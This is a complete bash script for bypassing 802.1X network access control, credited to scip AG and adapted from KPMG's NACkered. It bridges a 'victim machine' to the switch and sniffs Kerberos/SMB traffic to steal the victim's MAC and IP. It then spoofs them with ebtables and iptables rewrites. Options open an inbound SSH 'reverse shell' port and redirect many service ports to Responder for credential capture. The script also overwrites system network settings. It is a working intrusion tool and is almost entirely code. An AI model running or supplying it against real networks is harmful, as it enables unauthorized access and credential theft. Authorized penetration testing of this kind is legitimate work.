#!/bin/bash

# -----
# Name: nac_bypass_setup.sh
# scip AG - Michael Schneider
# -----
# Original Script:
# Matt E - NACkered v2.92.2 - KPMG LLP 2014
# KPMG UK Cyber Defence Services
# -----

## Variables
VERSION="0.6.1"

CMD_ARPTABLES=/usr/sbin/arptables-legacy
CMD_EBTABLES=/usr/sbin/ebtables-legacy
CMD_IPTABLES=/usr/sbin/iptables-legacy

## Text color variables - saves retyping these awful ANSI codes
TXTRST="\e[0m" # Text reset
SUCC="\e[1;32m" # green
INFO="\e[1;34m" # blue
WARN="\e[1;31m" # red
INP="\e[1;36m" # cyan

BRINT=br0 # bridge interface
SWINT=eth0 # network interface plugged into switch
SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'` # get SWINT MAC address automatically
COMPINT=eth1 # network interface plugged into victim machine

BRIP=169.254.66.66 # IP address for the bridge
BRGW=169.254.66.1 # Gateway IP address for the bridge

TEMP_FILE=/tmp/tcpdump.pcap
OPTION_RESPONDER=0
OPTION_SSH=0
OPTION_AUTONOMOUS=0
OPTION_CONNECTION_SETUP_ONLY=0
OPTION_INITIAL_SETUP_ONLY=0
OPTION_RESET=0

## Ports for Responder
PORT_UDP_NETBIOS_NS=137
PORT_UDP_NETBIOS_DS=138
PORT_UDP_DNS=53
PORT_UDP_LDAP=389
PORT_TCP_LDAP=389
PORT_TCP_SQL=1433
PORT_UDP_SQL=1434
PORT_TCP_HTTP=80
PORT_TCP_HTTPS=443
PORT_TCP_SMB=445
PORT_TCP_NETBIOS_SS=139
PORT_TCP_FTP=21
PORT_TCP_SMTP1=25
PORT_TCP_SMTP2=587
PORT_TCP_POP3=110
PORT_TCP_IMAP=143
PORT_TCP_PROXY=3128
PORT_UDP_MULTICAST=5553

DPORT_SSH=50222 #SSH call back port use victimip:50022 to connect to attackerbox:sshport
PORT_SSH=50022
RANGE=61000-62000 #Ports for my traffic on NAT

## display usage hints
Usage() {
  echo -e "$0 v$VERSION usage:"
  echo "    -1 <eth>    network interface plugged into switch"
  echo "    -2 <eth>    network interface plugged into victim machine"
  echo "    -a          autonomous mode"
  echo "    -c          start connection setup only"
  echo "    -h          display this help"
  echo "    -i          start initial setup only"
  echo "    -r          reset all settings"
  echo "    -R          enable port redirection for Responder"
  echo "    -S          enable port redirection for OpenSSH and start the service"
  exit 0
}

## display version info
Version() {
  echo -e "$0 v$VERSION"
  exit 0
}

## Check if we got all needed parameters
CheckParams() {
  while getopts ":1:2:achirRS" opts
    do
      case "$opts" in
        "1")
          SWINT=$OPTARG
          ;;
        "2")
          COMPINT=$OPTARG
          ;;          
        "a")
          OPTION_AUTONOMOUS=1
          ;;
        "c")
          OPTION_CONNECTION_SETUP_ONLY=1
          ;;
        "h")
          Usage
          ;;
        "i")
          OPTION_INITIAL_SETUP_ONLY=1
          ;;          
        "r")
          OPTION_RESET=1
          ;;
        "R")
          OPTION_RESPONDER=1
          ;;
        "S")
          OPTION_SSH=1
          ;;
        *)
          OPTION_RESPONDER=0
          OPTION_SSH=0
          OPTION_AUTONOMOUS=0
          ;;
      esac
  done
}

InitialSetup() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Starting NAC bypass! Stay tuned...$TXTRST"
        echo
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Doing some ground work$TXTRST"
        echo
    fi

    systemctl stop NetworkManager.service
    echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
    sysctl -p
    echo "" > /etc/resolv.conf

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] Ground work done.$TXTRST"
        echo
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Starting Bridge configuration$TXTRST"
        echo
    fi

    brctl addbr $BRINT # create bridge
    brctl addif $BRINT $COMPINT # add computer side to bridge
    brctl addif $BRINT $SWINT # add switch side to bridge

    echo 8 > /sys/class/net/br0/bridge/group_fwd_mask # forward EAP packets
    echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

    ifconfig $COMPINT 0.0.0.0 up promisc # bring up comp interface
    ifconfig $SWINT 0.0.0.0 up promisc # bring up switch interface

    macchanger -m 00:12:34:56:78:90 $BRINT # Swap MAC of bridge to an initialisation value
    macchanger -m $SWMAC $BRINT # Swap MAC of bridge to the switch side MAC

    ## Bringing up the Bridge
    ifconfig $BRINT 0.0.0.0 up promisc 

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] Bridge up, should be dark.$TXTRST"
        echo
        echo -e "$INP [ # ] Connect Ethernet cables to adatapers...$TXTRST"
        echo -e "$INP [ # ] Wait for 30 seconds then press any key...$TXTRST"
        echo -e "$WARN [ ! ] Victim machine should work at this point - if not, bad times are coming - run!!$TXTRST"
        read -p " " -n1 -s
        echo
    else
        sleep 25s
    fi
}

ConnectionSetup() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Resetting Connection$TXTRST"
        echo
    fi

    mii-tool -r $COMPINT
    mii-tool -r $SWINT

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Listening for Traffic (Kerberos and SMB)...$TXTRST"
        echo
    fi

    # We pcap any kerberos or smb traffic should be some in Windows land
    tcpdump -i $COMPINT -s0 -w $TEMP_FILE -c1 tcp dst port 88 or port 445 

    COMPMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp dst port 88 or port 445 | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
    GWMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp dst port 88 or port 445 | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}'`
    COMIP=`tcpdump -r $TEMP_FILE -nne -c 1 tcp dst port 88 or port 445 | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Processing packet and setting veriables $TXTRST"
        echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
        echo
    fi

    # Going Silent
    $CMD_ARPTABLES -A OUTPUT -j DROP
    $CMD_IPTABLES -A OUTPUT -j DROP

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Bringing up interface with bridge side IP address, setting up Layer 2 rewrite and default route. $TXTRST"
        echo
    fi
    ifconfig $BRINT $BRIP up promisc

    ## Setting up Layer 2 rewrite
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

    ## Create default routes so we can route traffic - all traffic goes to the bridge gateway and this traffic gets Layer 2 sent to GWMAC
    arp -s -i $BRINT $BRGW $GWMAC
    route add default gw $BRGW

    ## SSH CALLBACK if we receieve inbound on br0 for VICTIMIP:DPORT forward to BRIP on SSH
    if [ "$OPTION_SSH" -eq 1 ]; then

        if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
            echo
            echo -e "$INFO [ * ] Setting up SSH reverse shell inbound on $COMIP:$DPORT_SSH and start OpenSSH daemon $TXTRST"
            echo
        fi
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT_SSH -j DNAT --to $BRIP:$PORT_SSH
    fi

    if [ "$OPTION_RESPONDER" -eq 1 ]; then

        if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
            echo
            echo -e "$INFO [ * ] Setting up all inbound ports for Responder $TXTRST"
            echo
        fi

        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_NS -j DNAT --to $PORT_UDP_NETBIOS_NS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_DS -j DNAT --to $BRIP:$PORT_UDP_NETBIOS_DS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_DNS -j DNAT --to $BRIP:$PORT_UDP_DNS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_LDAP -j DNAT --to $BRIP:$PORT_UDP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_LDAP -j DNAT --to $BRIP:$PORT_TCP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SQL -j DNAT --to $BRIP:$PORT_TCP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_SQL -j DNAT --to $BRIP:$PORT_UDP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTP -j DNAT --to $BRIP:$PORT_TCP_HTTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTPS -j DNAT --to $BRIP:$PORT_TCP_HTTPS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMB -j DNAT --to $BRIP:$PORT_TCP_SMB
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_NETBIOS_SS -j DNAT --to $BRIP:$PORT_TCP_NETBIOS_SS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_FTP -j DNAT --to $BRIP:$PORT_TCP_FTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP1 -j DNAT --to $BRIP:$PORT_TCP_SMTP1
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP2 -j DNAT --to $BRIP:$PORT_TCP_SMTP2
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_POP3 -j DNAT --to $BRIP:$PORT_TCP_POP3
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_IMAP -j DNAT --to $BRIP:$PORT_TCP_IMAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_PROXY -j DNAT --to $BRIP:$PORT_TCP_PROXY
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_MULTICAST -j DNAT --to $BRIP:$PORT_UDP_MULTICAST
    fi

    # Setting up Layer 3 rewrite rules
    # Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

    ## START SSH
    if [ "$OPTION_SSH" -eq 1 ]; then    
        systemctl start ssh.service
    fi

    ## Finish
    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] All setup steps complete; check ports are still lit and operational $TXTRST"
        echo
    fi

    ## Re-enabling traffic flow; monitor ports for lockout
    $CMD_ARPTABLES -D OUTPUT -j DROP
    $CMD_IPTABLES -D OUTPUT -j DROP

    ## Housecleaning
    rm $TEMP_FILE

    ## All done!
    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INP [ * ] Time for fun & profit $TXTRST"
        echo
    fi
}

Reset() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Resetting all settings $TXTRST"
        echo
    fi    

    ## Bringing bridge down
    ifconfig $BRINT down
    brctl delbr $BRINT

    ## Delete default route
    arp -d -i $BRINT $BRGW $GWMAC
    route del default

    # Flush EB, ARP- and IPTABLES
    $CMD_EBTABLES -F
    $CMD_ARPTABLES -F
    $CMD_IPTABLES -F

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] All reset steps are completed. $TXTRST"
        echo
    fi    
}

## Main
CheckParams $@

if [ "$OPTION_RESET" -eq 1 ]; then
    Reset
    exit 0
fi

if [ "$OPTION_INITIAL_SETUP_ONLY" -eq 1 ]; then
    InitialSetup
    exit 0
fi

if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
    ConnectionSetup
    exit 0
fi

InitialSetup
ConnectionSetup
